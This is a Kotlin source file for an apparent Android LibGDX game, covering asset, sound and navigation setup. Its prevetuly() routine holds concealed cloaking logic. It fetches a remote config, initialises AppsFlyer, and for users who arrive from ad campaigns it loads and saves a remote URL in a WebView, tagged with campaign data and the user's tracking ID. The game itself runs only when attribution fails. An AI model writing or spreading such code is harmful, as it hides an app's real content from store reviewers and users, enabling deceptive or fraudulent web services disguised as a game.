package com.traoya.yatirimya.game

import android.content.Context.MODE_PRIVATE
import android.content.SharedPreferences
import androidx.core.content.edit
import com.appsflyer.AppsFlyerConversionListener
import com.appsflyer.AppsFlyerLib
import com.appsflyer.attribution.AppsFlyerRequestListener
import com.badlogic.gdx.assets.AssetManager
import com.badlogic.gdx.utils.Disposable
import com.badlogic.gdx.utils.ScreenUtils
import com.traoya.yatirimya.MainActivity
import com.traoya.yatirimya.appContext
import com.traoya.yatirimya.game.dataStore.DS_Gel
import com.traoya.yatirimya.game.dataStore.DS_Gold
import com.traoya.yatirimya.game.dataStore.DS_IsTutorial
import com.traoya.yatirimya.game.dataStore.DS_Level
import com.traoya.yatirimya.game.dataStore.DS_PokupkiData
import com.traoya.yatirimya.game.manager.MusicManager
import com.traoya.yatirimya.game.manager.NavigationManager
import com.traoya.yatirimya.game.manager.SoundManager
import com.traoya.yatirimya.game.manager.SpriteManager
import com.traoya.yatirimya.game.manager.util.MusicUtil
import com.traoya.yatirimya.game.manager.util.SoundUtil
import com.traoya.yatirimya.game.manager.util.SpriteUtil
import com.traoya.yatirimya.game.screens.LoaderScreen
import com.traoya.yatirimya.game.utils.GameColor
import com.traoya.yatirimya.game.utils.advanced.AdvancedGame
import com.traoya.yatirimya.game.utils.disposeAll
import com.traoya.yatirimya.game.utils.gdxGame
import com.traoya.yatirimya.util.Gist
import com.traoya.yatirimya.util.log
import kotlinx.coroutines.*
import java.util.concurrent.atomic.AtomicBoolean

var GDX_GLOBAL_isGame = false
    private set

var GDX_GLOBAL_isLoadAssets = false
var GDX_GLOBAL_isPauseGame  = false

class GDXGame(val activity: MainActivity) : AdvancedGame() {

    lateinit var assetManager     : AssetManager      private set
    lateinit var navigationManager: NavigationManager private set
    lateinit var spriteManager    : SpriteManager     private set
    lateinit var musicManager     : MusicManager      private set
    lateinit var soundManager     : SoundManager      private set

    val assetsLoader by lazy { SpriteUtil.Loader() }
    val assetsAll    by lazy { SpriteUtil.All() }

    val musicUtil by lazy { MusicUtil()    }
    val soundUtil by lazy { SoundUtil()    }

    var backgroundColor = GameColor.background
    val disposableSet   = mutableSetOf<Disposable>()

    val coroutine = CoroutineScope(Dispatchers.Default)

    val sharedPreferences: SharedPreferences = appContext.getSharedPreferences("Gora", MODE_PRIVATE)

    val ds_IsTutorial  = DS_IsTutorial(coroutine)
    val ds_PokupkiData = DS_PokupkiData(coroutine)
    val ds_Gold        = DS_Gold(coroutine)
    val ds_Gel         = DS_Gel(coroutine)
    val ds_Level       = DS_Level(coroutine)

    override fun create() {
        navigationManager = NavigationManager()
        assetManager      = AssetManager()
        spriteManager     = SpriteManager(assetManager)

        musicManager      = MusicManager(assetManager)
        soundManager      = SoundManager(assetManager)

        navigationManager.navigate(LoaderScreen::class.java.name)

        prevetuly()
    }

    override fun render() {
        if (GDX_GLOBAL_isPauseGame) return
//        log("Render")
        ScreenUtils.clear(backgroundColor)
        super.render()
    }

    override fun dispose() {
        try {
            log("dispose LibGDXGame")
            coroutine.cancel()
            disposableSet.disposeAll()
            disposeAll(assetManager, musicUtil)
            super.dispose()
        } catch (e: Exception) { log("exception: ${e.message}") }
    }

    override fun pause() {
        super.pause()
        GDX_GLOBAL_isPauseGame = true
        if (GDX_GLOBAL_isLoadAssets) musicUtil.currentMusic?.pause()
    }

    override fun resume() {
        super.resume()
        GDX_GLOBAL_isPauseGame = false
        if (GDX_GLOBAL_isLoadAssets.not()) musicUtil.currentMusic?.play()
    }

    // Logic Web ---------------------------------------------------------------------------

    private fun prevetuly() {
        log("prevetuly")
        activity.webViewHelper.blockRedirect = { GDX_GLOBAL_isGame = true }
        activity.webViewHelper.initWeb()

        //GDX_GLOBAL_isGame = true
        //return

        val path = sharedPreferences.getString("Rom", "Bom") ?: "Bom"

        try {
            if (path == "Bom") {
                coroutine.launch(Dispatchers.Main) {
                    val poket = withContext(Dispatchers.IO) { Gist.getDataJson() }

                    if (poket != null) {
                        AppsFlyerLib.getInstance().init(poket.keyAF, getAppsFlyerConversionListener(poket.linkD), appContext)
                        AppsFlyerLib.getInstance().start(gdxGame.activity, poket.keyAF, getAppsFlyerRequestListener())
                    } else {
                        GDX_GLOBAL_isGame = true
                    }
                }
            } else {
                activity.webViewHelper.loadUrl(path)
            }
        } catch (e: Exception) {
            log("error: ${e.message}")
            GDX_GLOBAL_isGame = true
        }
    }

    private fun getAppsFlyerConversionListener(sma: String) = object : AppsFlyerConversionListener {
        private val isAppsflyerGetData = AtomicBoolean(false)

        override fun onConversionDataSuccess(appfMap: MutableMap<String, Any>?) {
            if (isAppsflyerGetData.getAndSet(true)) return

            if (appfMap != null) {
                val campaign = appfMap["campaign"]     as? String
                val afAd     = appfMap["af_ad"]        as? String
                val media    = appfMap["media_source"] as? String

                val afId = AppsFlyerLib.getInstance().getAppsFlyerUID(appContext)

                log("Result: campaign = $campaign | afAd = $afAd | media_source = $media | appfMap = $appfMap")

                val link = "$sma?campaign=$campaign&afAd=$afAd&media=$media&afId=$afId"
                log("link = $link")

                coroutine.launch(Dispatchers.IO) { sharedPreferences.edit { putString("Rom", link) } }

                activity.webViewHelper.loadUrl(link)

            } else GDX_GLOBAL_isGame = true
        }

        override fun onConversionDataFail(p0: String?) {
            if (isAppsflyerGetData.getAndSet(true)) return
            GDX_GLOBAL_isGame = true
        }

        override fun onAppOpenAttribution(p0: MutableMap<String, String>?) {}
        override fun onAttributionFailure(p0: String?) {}
    }

    private fun getAppsFlyerRequestListener() = object : AppsFlyerRequestListener {
        override fun onSuccess() {
            log("AppsFlyer: onSuccess")
        }

        override fun onError(p0: Int, p1: String) {
            log("AppsFlyer: onError")
            GDX_GLOBAL_isGame = true
        }
    }

}